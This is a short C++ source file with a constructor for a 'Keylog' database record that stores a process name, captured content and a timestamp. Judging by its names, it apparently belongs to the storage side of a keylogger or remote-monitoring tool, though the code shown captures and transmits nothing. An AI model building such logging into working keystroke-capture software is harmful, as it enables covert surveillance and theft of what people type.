#include            "Database/Keylog.hpp"

Keylog::Keylog(const std::string& process_name, const std::string& content, const std::string &timestamp) : Bdd("Keylog", ToDo::create)
{
    this->addObject("process_name", new String(process_name));
    this->addObject("content", new String(content));
    this->addObject("timestamp", new String(timestamp));
}
